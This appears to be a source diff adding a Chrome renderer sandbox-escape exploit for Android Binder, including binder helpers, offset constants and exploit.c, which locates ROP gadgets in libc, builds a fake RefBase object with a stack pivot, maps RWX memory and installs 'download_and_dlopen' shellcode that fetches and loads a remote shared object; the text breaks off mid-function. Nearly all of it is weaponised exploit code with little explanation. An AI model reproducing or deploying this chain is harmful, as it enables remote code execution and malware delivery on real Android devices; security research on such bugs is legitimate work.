+	//tr->flags = TF_ONE_WAY;
+	tr->flags = one_way ? TF_ONE_WAY : 0;
+	/* We do accept FDS. */
+	tr->flags |= TF_ACCEPT_FDS;
+	tr->data.ptr.buffer = (binder_uintptr_t)opaque;
+	tr->data_size = opaque_size;
+	tr->data.ptr.offsets = (binder_uintptr_t)offsets;
+	tr->offsets_size = offsets_size;
+    tr->code = 1234;
+
+
+	/* Return a pointer to the location for the next command. */
+	return (void *)(tr + 1);
+}
+
+void *make_reply(void *buffer, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
+{
+	struct binder_transaction_data *tr;
+	*(uint32_t *)buffer = BC_REPLY;
+	tr = (struct binder_transaction_data *)( (char *)buffer + sizeof(uint32_t));
+
+	tr->target.handle = handle;
+	//tr->flags = TF_ONE_WAY;
+	tr->flags = one_way ? TF_ONE_WAY : 0;
+	tr->data.ptr.buffer = (binder_uintptr_t)opaque;
+	tr->data_size = opaque_size;
+	tr->data.ptr.offsets = (binder_uintptr_t)offsets;
+	tr->offsets_size = offsets_size;
+
+
+	/* Return a pointer to the location for the next command. */
+	return (void *)(tr + 1);
+}
+
+
+int binder_transaction(struct binder_state *bs, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
+{
+	struct binder_transaction_data *tr;
+	uint8_t buffer[sizeof(uint32_t) + sizeof(*tr)];
+	// uint32_t remaining = 0;
+	// uint32_t consumed = 0;
+
+	make_transaction(buffer, one_way, handle, opaque, opaque_size, offsets, offsets_size);
+
+	/* Sending the transaction. */
+	int res = binder_write(bs, buffer, sizeof(buffer));
+	if (res < 0)
+		return res;
+#if 0
+	uint32_t r[32];
+	int r2;
+	r2 = binder_read(bs->fd, r, 32 * sizeof(uint32_t));
+	/* TODO: Check results. */
+	int i;
+#endif
+
+
+	return res;
+}
+
+int binder_reply(struct binder_state *bs, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
+{
+	void *buffer;
+	struct binder_transaction_data *tr;
+	size_t size = sizeof(uint32_t) + sizeof(*tr);
+
+
+	buffer = malloc(size);
+	if (buffer == NULL) {
+		log_err("[-] binder_transaction. Failed to allocate memory.\n");
+		return -1;
+	}
+
+	bzero(buffer, size);
+
+
+	make_transaction(buffer, false, handle, opaque, opaque_size, offsets, offsets_size);
+
+	*(uint32_t *)(buffer) = BC_REPLY;
+
+	/* Sending the transaction. */
+	int res = binder_write(bs, buffer, size);
+	/* TODO: Check result. */
+
+	uint32_t r[32];
+	int r2;
+	r2 = binder_read(bs->fd, r, 32 * sizeof(uint32_t));
+	/* TODO: Check results. */
+	// int i;
+
+	free(buffer);
+
+	return res;
+}
+
+uint32_t binder_read_next(struct binder_state *bs, void *data, uint32_t *remaining, uint32_t *consumed)
+{
+	int res;
+	uint32_t cmd;
+	char *ptr, *end;
+
+//	log_info("remaining: %x\nconsumed: %x\n", *remaining, *consumed);
+
+	if (!*remaining) {
+		/* Read the first 8 bytes. */
+//		log_info("before read\n");
+		res = binder_read(bs->fd, data, 32 * sizeof(uint32_t));
+//		log_info("after read: %x\n", res);
+		if (res < 0) {
+			log_err("binder_read_next: %s\n", strerror(errno));
+			return (uint32_t)-1;
+		}
+
+		*remaining = res;
+		*consumed = 0;
+	}
+
+
+	ptr = (char *)data;
+	ptr += *consumed;
+	end = ptr + *remaining;
+
+	cmd = *(uint32_t *)ptr;
+
+	*consumed += sizeof(uint32_t);
+	*remaining -= sizeof(uint32_t);
+	ptr += sizeof(uint32_t);
+
+	//log_info("cmd: %s\n", cmd_name(cmd));
+	switch (cmd) {
+		case BR_NOOP:
+			res = 0;
+			break;
+
+		case BR_RELEASE:
+		case BR_DECREFS:
+		case BR_ACQUIRE:
+		case BR_INCREFS:
+			res =2 * sizeof(uint64_t);
+			*consumed += res;
+			*remaining -= res;
+			break;
+		case BR_REPLY:
+		case BR_TRANSACTION:
+			res = sizeof(struct binder_transaction_data);
+			*consumed += res;
+			*remaining -= res;
+			break;
+		case BR_FAILED_REPLY:
+		case BR_TRANSACTION_COMPLETE:
+			res = 0;
+			break;
+		default:
+			log_err("Unhandle command %s\n", cmd_name(cmd));
+			exit(1);
+			return (uint32_t)-1;
+
+	}
+
+	/* Update ptr and size */
+	return cmd;
+}
+
+uint32_t binder_read_next_dbg(struct binder_state *bs, void *data, uint32_t *remaining, uint32_t *consumed)
+{
+	int res;
+	uint32_t cmd;
+	char *ptr, *end;
+
+	log_info("remaining: %x\nconsumed: %x\n", *remaining, *consumed);
+
+	if (!*remaining) {
+		/* Read the first 8 bytes. */
+//		log_info("before read\n");
+		res = binder_read(bs->fd, data, 32 * sizeof(uint32_t));
+//		log_info("after read: %x\n", res);
+		if (res < 0) {
+			log_err("binder_read_next: %s\n", strerror(errno));
+			return (uint32_t)-1;
+		}
+
+		*remaining = res;
+		*consumed = 0;
+	}
+
+
+	ptr = (char *)data;
+	ptr += *consumed;
+	end = ptr + *remaining;
+
+	cmd = *(uint32_t *)ptr;
+
+	*consumed += sizeof(uint32_t);
+	*remaining -= sizeof(uint32_t);
+	ptr += sizeof(uint32_t);
+
+	log_info("cmd: %s\n", cmd_name(cmd));
+	switch (cmd) {
+		case BR_NOOP:
+			res = 0;
+			break;
+
+		case BR_RELEASE:
+		case BR_DECREFS:
+		case BR_ACQUIRE:
+		case BR_INCREFS:
+			log_info("ptr: 0x%llx\n", *(uint64_t *)(ptr));
+			log_info("cookie: 0x%llx\n", *(uint64_t *)(ptr + 0x8));
+			res =2 * sizeof(uint64_t);
+			*consumed += res;
+			*remaining -= res;
+			break;
+		case BR_REPLY:
+		case BR_TRANSACTION:
+			res = sizeof(struct binder_transaction_data);
+			*consumed += res;
+			*remaining -= res;
+			break;
+		case BR_FAILED_REPLY:
+		case BR_TRANSACTION_COMPLETE:
+			res = 0;
+			break;
+		default:
+			log_err("Unhandle command %s\n", cmd_name(cmd));
+			exit(1);
+			return (uint32_t)-1;
+
+	}
+
+	/* Update ptr and size */
+	return cmd;
+}
+
diff --git a/content/renderer/binder.h b/content/renderer/binder.h
new file mode 100644
index 000000000000..03b7c5944b87
--- /dev/null
+++ b/content/renderer/binder.h
@@ -0,0 +1,123 @@
+/* Copyright 2008 The Android Open Source Project
+ */
+
+#ifndef _BINDER_H_
+#define _BINDER_H_
+
+#include <sys/ioctl.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include "uapi_binder.h"
+
+struct binder_state
+{
+    int fd;
+    void *mapped;
+    size_t mapsize;
+};
+
+struct binder_io
+{
+    char *data;            /* pointer to read/write from */
+    binder_size_t *offs;   /* array of offsets */
+    size_t data_avail;     /* bytes available in data buffer */
+    size_t offs_avail;     /* entries available in offsets array */
+
+    char *data0;           /* start of data buffer */
+    binder_size_t *offs0;  /* start of offsets buffer */
+    uint32_t flags;
+    uint32_t unused;
+};
+
+struct binder_death {
+    void (*func)(struct binder_state *bs, void *ptr);
+    void *ptr;
+};
+
+/* the one magic handle */
+#define BINDER_SERVICE_MANAGER  0U
+
+#define SVC_MGR_NAME "android.os.IServiceManager"
+
+enum {
+    /* Must match definitions in IBinder.h and IServiceManager.h */
+    PING_TRANSACTION  = B_PACK_CHARS('_','P','N','G'),
+    INTERFACE_TRANSACTION   = B_PACK_CHARS('_', 'N', 'T', 'F'),
+    SHELL_COMMAND_TRANSACTION = B_PACK_CHARS('_','C','M','D'),
+    SVC_MGR_GET_SERVICE = 1,
+    SVC_MGR_CHECK_SERVICE,
+    SVC_MGR_ADD_SERVICE,
+    SVC_MGR_LIST_SERVICES,
+    SVC_MGR_GET_RANDOM,
+};
+
+typedef int (*binder_handler)(struct binder_state *bs,
+                              struct binder_transaction_data *txn,
+                              struct binder_io *msg,
+                              struct binder_io *reply);
+
+struct binder_state *binder_open(const char* driver, size_t mapsize);
+void binder_close(struct binder_state *bs);
+
+/* initiate a blocking binder call
+ * - returns zero on success
+ */
+int binder_call(struct binder_state *bs,
+                struct binder_io *msg, struct binder_io *reply,
+                uint32_t target, uint32_t code);
+
+int binder_call2(struct binder_state *bs,
+                struct binder_io *msg, struct binder_io *reply,
+                uint32_t target, uint32_t code, char *buffer);
+
+/* release any state associate with the binder_io
+ * - call once any necessary data has been extracted from the
+ *   binder_io after binder_call() returns
+ * - can safely be called even if binder_call() fails
+ */
+void binder_done(struct binder_state *bs,
+                 struct binder_io *msg, struct binder_io *reply);
+
+/* manipulate strong references */
+void binder_acquire(struct binder_state *bs, uint32_t target);
+void binder_release(struct binder_state *bs, uint32_t target);
+
+void binder_link_to_death(struct binder_state *bs, uint32_t target, struct binder_death *death);
+
+void binder_loop(struct binder_state *bs, binder_handler func);
+
+int binder_become_context_manager(struct binder_state *bs);
+
+/* allocate a binder_io, providing a stack-allocated working
+ * buffer, size of the working buffer, and how many object
+ * offset entries to reserve from the buffer
+ */
+void bio_init(struct binder_io *bio, void *data,
+           size_t maxdata, size_t maxobjects);
+
+void bio_put_obj(struct binder_io *bio, void *ptr);
+void bio_put_ref(struct binder_io *bio, uint32_t handle);
+void bio_put_fd(struct binder_io *bio, int fd);
+void *bio_put_ptr(struct binder_io *bio, void *buffer, uint32_t size, uint32_t *off);
+void bio_put_fd_array(struct binder_io *bio, uint64_t parent, uint64_t parent_offset, int num_fds);
+void bio_put_uint32(struct binder_io *bio, uint32_t n);
+void bio_put_string16(struct binder_io *bio, const uint16_t *str);
+void bio_put_string16_x(struct binder_io *bio, const char *_str);
+void bio_put_string16_x_pad(struct binder_io *bio, const char *_str, int padding);
+
+
+uint32_t bio_get_uint32(struct binder_io *bio);
+uint16_t *bio_get_string16(struct binder_io *bio, size_t *sz);
+uint32_t bio_get_ref(struct binder_io *bio);
+void *bio_alloc(struct binder_io *bio, size_t size);
+
+int binder_write(struct binder_state *bs, void *data, size_t len);
+int binder_read(int fd, void *buffer, size_t size);
+int binder_transaction(struct binder_state *bs, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size);
+
+void binder_free_buffer(struct binder_state *bs, binder_uintptr_t buffer_to_free);
+void binder_free_buffers(struct binder_state *bs, binder_uintptr_t buffer_to_free);
+
+void bio_put_null_obj(struct binder_io *bio);
+
+#endif
diff --git a/content/renderer/binder_lookup.h b/content/renderer/binder_lookup.h
new file mode 100644
index 000000000000..78f12369b199
--- /dev/null
+++ b/content/renderer/binder_lookup.h
@@ -0,0 +1,11 @@
+#ifndef __BINDER_LOOKUP_H
+
+#define __BINDER_LOOKUP_H
+
+int publish_handle(struct binder_state *bs, char *name, uint64_t handle);
+uint32_t grab_handle(struct binder_state *bs, char *name);
+uint32_t grab_handle_and_buffer(struct binder_state *bs, char *name, uint64_t *buffer_end);
+void cleanup_lookup(struct binder_state *bs);
+int *get_app_tasks(struct binder_state *bs, int am, char *package, int *num);
+
+#endif
\ No newline at end of file
diff --git a/content/renderer/constants.h b/content/renderer/constants.h
new file mode 100644
index 000000000000..24fa970c6fe6
--- /dev/null
+++ b/content/renderer/constants.h
@@ -0,0 +1,19 @@
+/* 
+ * Address and size of the second stage mapping.
+ */
+#define SECOND_STAGE_ADDR 0x30303000  
+#define SECOND_STAGE_MAP_SIZE 0x8000
+
+
+/* Size of the data in the sent transaction, aligned to the next multiple of 8. */
+#define DATA_SIZE 0x148 
+
+/* Index of OOB offset when used as a parent. This is num objects + 2 */
+#define OOB_OFFSET_INDEX 10
+
+/* Offset of the legitimate PTR within the transaction data */
+#define LEGIT_PTR_OFFSET 0xa4
+
+/* The interface of the object provided by the browser process. */
+
+#define IPARENT_PROCESS_INTERFACE "org.chromium.base.process_launcher.IParentProcess"
\ No newline at end of file
diff --git a/content/renderer/exploit.c b/content/renderer/exploit.c
new file mode 100644
index 000000000000..d1fcbd877201
--- /dev/null
+++ b/content/renderer/exploit.c
@@ -0,0 +1,968 @@
+#include <android/log.h>
+#include <dlfcn.h>
+#include <errno.h>
+#define DO_LOG(...) __android_log_print(ANDROID_LOG_DEBUG, "PWN", __VA_ARGS__)
+
+#include "binder.c"
+
+#include "constants.h"
+#include "sc.h"
+#include "rop.h"
+
+/* Data buffer we use for binder transactions */
+uint8_t binder_data[0xfe000];
+
+/*
+ * Encode a BL instruction to a given `distance` from the
+ * current PC.
+ */
+uint32_t encode_bl(uint32_t distance) {
+  uint16_t imm0 = (distance >> 1) & ((1<<11)-1);
+  uint16_t imm1 = (distance >> 12) & ((1<<11)-1);
+  return ((0xf000 | imm1) | ((0xf800 | imm0)<<16));
+}
+
+/*
+ * Search for a BL from the current PC to `target`, starting at 
+ * `start`. We encode the relative branch using `encode_bl` at each
+ * 16-bit offset and check against the observed data.
+ */
+
+void *find_bl(char *start, char *target) {
+  for (int i=0; i < 0x100; i++) {
+    uint32_t data = *(uint32_t *)start;
+    
+    if (data == encode_bl(target - (start+4))) {
+      void *ret = start;
+      return ret;
+    }
+    start += 2;
+  }
+  return NULL;
+}
+
+/*
+ * Should return 0 on match
+ */
+int contains(const char *string, const char *wanted) {
+  return (strstr(string, wanted) == NULL); 
+}
+
+/*
+ * Find the first mapping whose name matches the string `wanted`
+ * as indicated by the function `fun` returning 0.
+ */
+
+extern "C" void *find_mapping(const char *wanted, size_t *size, int (*fun)(const char *, const char *)) {
+  char line[1024];
+  FILE *fp = fopen("/proc/self/maps", "r");
+
+  uint64_t start_map = 0, addr, end_addr;
+
+  while (fgets(&line[0], 1024, fp) != NULL ){
+    char *name = strrchr(line, ' ');
+    
+    if (name == NULL)
+      continue;
+
+    name++;
+    name[strcspn(name, "\n")] = 0;
+
+    addr = strtoull(line, NULL, 16);
+
+    int match = !fun(name, wanted);
+    if (match && !start_map) {
+      /* Found our target map, take note */
+      start_map = addr;
+      /* If we don't need the size we can return now */
+      if (!size)
+        return (void *)start_map;
+    } else if (!match && start_map ) {
+       // Have a map, but no match -> compute size and return
+      break;
+    }
+
+    /* Update end_addr */
+    char *end = &line[strcspn(line, "-") + 1];
+    end_addr = strtoull(end, NULL, 16);
+
+  }
+
+  /* Want size and have map? Compute */
+  if (size && start_map) {
+    *(size) = (size_t)(end_addr - start_map);
+  }
+
+  return (void *)start_map;
+}
+
+/*
+ * Find a handle in the current binder state given an interface. 
+ * Used for finding the handle to an IParentProcess owned by the 
+ * chrome broker.
+ */
+uint32_t find_handle_by_interface(binder_state *bs, const char *interface) {
+  char txn_data[0x1000];
+  char reply_data[0x1000];
+  struct binder_io msg;
+  struct binder_io reply;
+
+  /* Iterate for a maximum of 100 handles */
+  for(int handle=1; handle <= 100; handle++) {
+    bio_init(&msg, txn_data, sizeof(txn_data), 10);
+    bio_init(&reply, reply_data, sizeof(reply_data), 10);
+
+    /* Retrieve handle interface */
+    int ret = binder_call(bs, &msg, &reply, handle, INTERFACE_TRANSACTION);
+
+    /* Check against wanted interface */
+    if (!ret) {
+      size_t sz = 0;
+      
+      char string[1000] = {0};
+      uint16_t *str16 = bio_get_string16(&reply, &sz);
+      if (sz != 0 && sz < sizeof(string)-1) {
+        /* Convert to regular string */
+        for (uint32_t x=0 ; x < sz; x++)
+            string[x] = (char)str16[x];
+
+        /* Return if it matches */
+        if (!strcmp(interface, string))
+          return handle;
+      }
+    }
+  }
+
+  return -1;
+}
+
+/*
+ * Heuristic dlopen search. The function we are looking for is named
+ * __loader_dlopen and is inside the `linker` mapping.
+ *
+ * We pass in the linker address and size, and search for this pattern
+ * to identify dlopen.
+ *
+ * Tested on Pixel 3 running Android 10.
+ */
+#define DLOPEN_PART1 "\x0d\x46\x78\x44"
+void *find_dlopen(void *linker, size_t size) {
+
+  /* Find first part */
+  while (size) {
+    void *found = memmem(linker, size, DLOPEN_PART1, 4);
+
+    if (!found) {
+      // DO_LOG("First pattern not found :-/");
+      return NULL;
+    }
+
+    if ( *((char *)found + 10) == 0x78 && *((char *)found + 11) == 0x44) {
+
+      return (void *)((char *)found -8 + 1);
+    }
+
+    // DO_LOG("Second pattern not found :-/");
+
+    /* Second part not found, go next */
+    size -= ((char *)found - (char *)linker) + 4;
+    linker = (void *)((char *)found + 4);
+  }
+
+  return NULL;
+}
+
+/*
+ * Heuristic dlsym search. The function we are looking for is named
+ * dlsym_impl and is inside the `linker` mapping.
+ *
+ * We pass in the linker address and size, and search for this pattern
+ * to identify dlsym.
+ *
+ * Tested on Pixel 3 running Android 10.
+ */
+#define DLSYM_PART1 "\x1d\x48\x1d\x46\x16\x46\x78\x44\x0f\x46"
+#define DLSYM_PART2 "\x78\x44\xD0\xF8\x00\x80"
+void *find_dlsym(void *linker, size_t size) {
+
+  /* Find first part */
+  while (size) {
+    void *found = memmem(linker, size, DLSYM_PART1, 10);
+
+    if (!found) {
+      return NULL;
+    }
+
+    if ( !memcmp((char*)found + 10 + 6, DLSYM_PART2, 6)) {
+      return (void *)((char *)found -8 + 1);
+    }
+
+    /* Second part not found, go next */
+    size -= ((char *)found - (char *)linker) + 8;
+    linker = (void *)((char *)found + 8);
+  }
+
+  return NULL;
+}
+
+/*
+ * Find maximum transaction size we can successfully send. We 
+ * want to utilize the full mapping, so we can predict where 
+ * our buffer has landed.
+ */
+uint32_t find_transaction_size(binder_state *bs, int handle) {
+  
+  /*
+   * Apps normally map 0xfe000 bytes at the binder mapping, and 
+   * Chrome only ever uses the first few of those.
+   */
+
+  int max = 0xfe000;
+
+  /* Search backwards until we can send the transaction */
+  while (max > 0) {
+    uint32_t reply;
+    binder_transaction(bs, false, handle, binder_data, max, NULL, 0);
+    uint32_t consumed = 0, remaining = 0;
+
+    do {
+      reply = binder_read_next(bs, binder_data, &remaining, &consumed);
+    } while (reply != BR_FAILED_REPLY && reply != BR_REPLY);
+
+    /* If we got a BR_REPLY we sent it successfully so we can exit */
+    if (reply == BR_REPLY)
+      break;
+
+    max -= 0x8;
+  }
+
+  return max;
+}
+
+/*
+ * Find a ROP gadget described by `gadget` inside the mapping starting
+ * at `libc` with size `libc_size`.
+ *
+ * Resolved address is placed into `gadget->address` if found.
+ *
+ * Returns 0 on success.
+ */
+int find_gadget(uint32_t libc, size_t libc_size, gadget_t *gadget) {
+  
+
+  do {
+    uint32_t found = (uint32_t)memmem((void *)libc, libc_size, gadget->pattern, gadget->pattern_size);
+    if (!found) {
+      return -1;
+    }
+
+    if ( gadget->thumb && !(found & 1)) {
+      /* Properly aligned thumb gadget */
+      gadget->address = found + 1;
+      return 0;
+
+    } else if (!gadget->thumb && !(found & 3)) {
+      /* Properly aligned arm gadget */
+      gadget->address = found;
+      return 0;
+    } else {
+      /* Misaligned gadget, ignore! */
+      libc = found + gadget->pattern_size;
+      libc_size -= gadget->pattern_size;
+
+    }
+
+  } while (libc_size > gadget->pattern_size);
+
+  return -1;
+}
+
+/*
+ * Find all required ROP gadgets inside mapping at `libc` of size `libc_size`.
+ */
+int find_rop_gadgets(uint32_t libc, size_t libc_size) {
+  for (uint32_t i=0; i < sizeof(gadgets)/sizeof(gadgets[0]); i++) {
+    if (gadgets[i].gadget != i) {
+      DO_LOG("[!] ERROR: Unexpected order in gadgets array. Expected %d, found %d\n", i, gadgets[i].gadget);
+      return -1;
+    }
+
+    if (find_gadget(libc, libc_size, &gadgets[i]) != 0) {
+      DO_LOG("[!] ERROR: Could not find gadget %d\n", gadgets[i].gadget);
+      return -1;
+    }
+
+    DO_LOG("[*] Found gadget %d at 0x%x\n", i, gadgets[i].address);
+  }
+
+  return 0;
+}
+
+/*
+ * Prepare the fake object we'll send to the remote process. Performs
+ * all preparation to get code execution on the browser side.
+ */
+
+int prepare_fake_object(uint32_t *fake_object, uint32_t fake_object_addr) {
+  void *(*linker_dlopen)(const char *path, int flags, void *caller) = NULL;
+  void *(*linker_dlsym)(void *handle, const char *symbol, void *must_be_null, void *caller) = NULL;
+
+  size_t libc_size = -1;
+  uint32_t libc = (uint32_t)find_mapping("libc.so", &libc_size, contains);
+
+  DO_LOG("[*] libc: 0x%x , libc size: 0x%x\n", libc, libc_size);
+
+  
+  /* Find rop gadgets by inspecting libc */
+  if (find_rop_gadgets(libc, libc_size) != 0) {
+    DO_LOG("[!] Failed to find rop gadgets. Aborting.\n");
+    return -1;
+  }
+
+  /* Find dlopen implementation */
+  void *handle = dlopen("libc.so", RTLD_NOW);
+  void *libc_open = dlsym(handle, "open");
+  DO_LOG("[*] Handle: %p, open: %p\n", handle, libc_open);
+
+
+
+  size_t linker_size = -1;
+  void *linker = find_mapping("bin/linker", &linker_size, contains);
+  DO_LOG("[*] Linker mapping at %p, size %x\n", linker, linker_size);
+
+  /* Ensure we can read it */
+  mprotect(linker, linker_size, PROT_READ | PROT_WRITE | PROT_EXEC);
+  linker_dlopen = (void *(*)(const char *path, int flags, void *caller))find_dlopen(linker, linker_size);
+  DO_LOG("[*] Found linker dlopen: %p\n", linker_dlopen);
+
+  linker_dlsym = (void *(*)(void *handle, const char *symbol, void *must_be_null, void *caller))find_dlsym(linker, linker_size);
+
+  /* 
+   * We use the address of the __sF symbol as temporary storage. From the source code,
+   * this symbol appears to be unused in the current bionic library. 
+   */
+
+  uint32_t utmp = (uint32_t)dlsym(handle, "__sF");
+  DO_LOG("[*] Temporary storage: %x\n", utmp);
+
+  if (!utmp) {
+    DO_LOG("[!] Didn't find temp storage!!\n");
+    return -1;
+  }
+
+
+  DO_LOG("[*] fake_object_addr: %x\n", fake_object_addr);
+
+  /*
+   * RefBase is 12bytes earlier than this pointer, so we point it to the next slot + 12.
+   * Since our stack pivot moves the stack to `fake_object`, we need to make sure this points
+   * far enough for our gadgets to fit.
+   *
+   * This address also becomes `r2` when our stack pivot executes.
+   */
+  uint64_t offset_ref_base = 0xd0;
+  fake_object[0] = fake_object_addr + offset_ref_base*sizeof(uint32_t) + 12; 
+
+  /* The stack pivot pops r5, ip, sp, lr and pc from here */
+  uint32_t idx = 1;
+  fake_object[idx++] = 0xc0c0c0c0; //r5
+  fake_object[idx++] = 0xc0c0c0c0; //ip
+  fake_object[idx++] = fake_object_addr + 6*sizeof(uint32_t); // new sp
+  fake_object[idx++] = gadgets[POP_PC].address; //lr
+  fake_object[idx++] = gadgets[POP_R0_PC].address ; // pop {r0, pc}
+
+  /* 
+   * This is where our stack lands. However this is a read-only mapping so 
+   * we cannot yet use it for calling C-level functions that may use the 
+   * stack themselves.
+   * 
+   * We will first save a copy of the registers that point to the stack
+   * in libc's .data section, then proceed to allocate shellcode.
+   */
+
+
+  DO_LOG("[*] Register scratch space: %x\n", utmp);
+  uint32_t saved_sp_offset;
+  saved_sp_offset = utmp + 3*sizeof(uint32_t);
+
+  fake_object[idx++] = saved_sp_offset;           // r0 = writable address in libc
+  fake_object[idx++] = gadgets[SAVE_SP].address;  // Store r7
+
+  fake_object[idx++] = 0xc0c0c0c0; // add sp, 0xc
+  fake_object[idx++] = 0xc0c0c0c0; // 
+  fake_object[idx++] = 0xc0c0c0c0; // 
+  fake_object[idx++] = 0xc0c0c0c0; // r4
+  fake_object[idx++] = 0xc0c0c0c0; // r5
+  fake_object[idx++] = 0xc0c0c0c0; // r6
+  fake_object[idx++] = 0xc0c0c0c0; // r7
+
+  /*
+   * Now our real stack is at `saved_sp_offset` so we can restore later.
+   * Let's allocate new RWX space at SECOND_STAGE_ADDR.
+   */
+
+  fake_object[idx++] = gadgets[POP_R0_TO_R7_MINUS_R4].address;  //pc
+  fake_object[idx++] = SECOND_STAGE_ADDR;             //r0 = addr
+  fake_object[idx++] = SECOND_STAGE_MAP_SIZE;                      //r1 = len
+  fake_object[idx++] = PROT_READ | PROT_WRITE | PROT_EXEC;         //r2 = prot
+  fake_object[idx++] = MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE;    //r3 = flags
+  fake_object[idx++] = 0;                                          // r5 = off hi
+  fake_object[idx++] = 0;                                          //r6 = off lo
+  fake_object[idx++] = __NR_mmap2;                                 //r7 = syscall mmap2
+
+  fake_object[idx++] = gadgets[POP_R4].address;                              //pc
+  fake_object[idx++] = -1;                                         //r4 = fd, ignored but let's set to -1
+
+  /*
+   * This gadget jumps in the middle of a function and will use the LR we prepared
+   * earlier for the return. We pointed it to `pop {pc}` to ensure easy ROP chain
+   * continuation.
+   */
+
+  fake_object[idx++] = gadgets[MMAP2_SVC].address;                           
+
+  /* MMAP2_SVC will pop {r4-r7} */
+  fake_object[idx++] = 0; 
+  fake_object[idx++] = 0;
+  fake_object[idx++] = 0;
+  fake_object[idx++] = 0;
+
+
+  /* Fixup copy shellcode */
+  copy_sc[9] = fake_object_addr + (offset_ref_base + 12)*sizeof(uint32_t); // src is after our fake RefBase class
+  copy_sc[10] = SECOND_STAGE_ADDR + SECOND_STAGE_MAP_SIZE - 0x2000; // dst
+
+  DO_LOG("[*] Final shellcode expected at %x\n", copy_sc[9]);
+  DO_LOG("[*] Final shellcode location %x\n", copy_sc[10]);
+
+  /* 
+   * Use a few ROP gadgets to copy the shellcode into place.
+   */
+
+  uint32_t copy_sc_addr = SECOND_STAGE_ADDR + SECOND_STAGE_MAP_SIZE - 0x2800;
+  DO_LOG("[*] Shellcode copy at %x\n", copy_sc_addr);
+
+  /* We'll copy a small thumb shellcode in to then copy the real shellcode. */
+
+  for (uint32_t i=0; i < sizeof(copy_sc)/sizeof(copy_sc[0]); i++) {
+    fake_object[idx++] = gadgets[POP_R0_PC].address;
+    fake_object[idx++] = copy_sc_addr + i*sizeof(uint32_t);
+    fake_object[idx++] = gadgets[POP_R1_PC].address;
+    fake_object[idx++] = copy_sc[i];
+    fake_object[idx++] = gadgets[STR_R1_R0].address;
+    fake_object[idx++] = 0; // r7
+  }
+  
+  /*
+   * We need to cacheflush and jump to it next, but we need to pivot the
+   * stack before we call cacheflush in the libc.
+   */
+
+  /* Setup LR so that cacheflush will jump to the shellcode after it's done */
+  fake_object[idx++] = gadgets[POP_LR_PC].address; 
+  fake_object[idx++] = copy_sc_addr + 1; // lr = &shellcode + 1, because it is thumb.
+
+  /* Now set r0/r1 to point to the right place, the stack pointer into our mapping, and jump to cacheflush */
+  fake_object[idx++] = gadgets[POP_R0_R1_IP_SP_PC].address; 
+  fake_object[idx++] = copy_sc_addr;
+  fake_object[idx++] = copy_sc_addr + 0x1000;
+  fake_object[idx++] = 0;
+  fake_object[idx++] = SECOND_STAGE_ADDR + SECOND_STAGE_MAP_SIZE - 0x3000; // sp
+  fake_object[idx++] = (uint32_t)&cacheflush; // Jump to cacheflush!
+
+
+  /*
+   * Sanity check that we left enough space.
+   */
+  if (idx >= offset_ref_base ) {
+    DO_LOG("[!!!!] ERROR! ROPchain is too large!\n");
+    return 0xd00d;
+  }
+
+ 
+  /*
+   * This is a fake RefBase class, with a pointer to a writable area in libc.
+   * We need this because our object is located in the binder mapping and cannot
+   * be written to from usermode. 
+   * 
+   * The RefBase code will try to increment a refcount before we get control, so
+   * pointing it to an empty buffer is fine. The only thing we need to take care of 
+   * is preventing it from being the special `initial value` of strong ref counts,
+   * because in this case the code will also do a virtual functionc all through this 
+   * fake object.
+   */
+
+  fake_object[offset_ref_base] = (offset_ref_base + 1)*sizeof(uint32_t); /* This is used as an offset from the base object*/
+  fake_object[offset_ref_base+1] = 0xdeadbeef;                           /* Unused */
+  fake_object[offset_ref_base+2] = (uint32_t)utmp;                       /* Writable address in libc */
+
+  /* Here comes the PC control. We point it to a stack pivot, and r0
+   * points to the beginning of our object (i.e to &fake_object[0]).
+   */
+
+  fake_object[offset_ref_base +11] = gadgets[STACK_PIVOT].address;
+
+  char *libart = (char *)find_mapping("libart.so", NULL, contains);
+  DO_LOG("libart: %p\n", libart);
+
+  /* Get a handle to libart, pretending we are calling from within libart itself */
+  void *libart_handle = linker_dlopen("/apex/com.android.runtime/lib/libart.so", RTLD_NOW, libart);
+  if (!libart_handle) {
+    DO_LOG("[!] Failed to get libart handle\n");
+    return -1;
+  }
+
+  /*
+   * We'll find the return address our shellcode should search for in the stack,
+   * so we can return cleanly after restoring all registers.
+   */
+
+  void *art_quick_invoke_stub = linker_dlsym(libart_handle, "art_quick_invoke_stub", NULL, libart);
+  if (!art_quick_invoke_stub) {
+    DO_LOG("[!] Failed to find art_quick_invoke_stub\n");
+    return -1;
+  }
+
+  void *art_method_invoke = linker_dlsym(libart_handle, "_ZN3art9ArtMethod6InvokeEPNS_6ThreadEPjjPNS_6JValueEPKc", NULL, libart);
+  if (!art_method_invoke) {
+    DO_LOG("[!] Failed to find art_method_invoke\n");
+    return -1;
+  }
+
+  /*
+   * The return address should be just after a branch from ArtMethod::Invoke to art_quick_invoke_stub.
+   * We are dealing with thumb mode, so strip off the last bit from the addresses we found, and add 
+   * 4 (for the size of the BL) and 1 (for thumb mode) to the branch address.
+   */
+
+  void *return_address = (char *)find_bl((char *)((uint32_t)art_method_invoke & ~1), (char *)((uint32_t)art_quick_invoke_stub & ~1)) + 4 + 1;
+  
+  if (!return_address) {
+    DO_LOG("[!] Failed to find return_address\n");
+    return -1;
+  }  
+
+  DO_LOG("[*] Expected return address: %p\n", return_address);
+
+  /*
+   * Fixup dlopen shellcode before copying it into its place.
+   * We need to set the address where 'r7' was saved and 
+   * the return address it should search for on the stack.
+   *
+   * Additionally it needs to know the linker dlopen address and the 
+   * address of open.
+   */
+  
+  *(uint32_t *)(download_and_dlopen_sc + 4) = saved_sp_offset;
+  *(uint32_t *)(download_and_dlopen_sc + 8) = (uint32_t)return_address;
+  *(uint32_t *)(download_and_dlopen_sc + 12) = (uint32_t)linker_dlopen;
+  *(uint32_t *)(download_and_dlopen_sc + 16) = (uint32_t)libc_open;
+
+  char *sc_addr = (char *)(&fake_object[offset_ref_base + 12]);
+  memcpy(sc_addr, download_and_dlopen_sc, sizeof(download_and_dlopen_sc));
+  
+  /*
+   * Add the path where the shellcode will store the downloaded shared object, 
+   * which is then loaded via the internal dlopen function.
+   * 
+   * Note: the target path must be writable for the browser. This needs to change when running 
+   * against an official build.
+   */
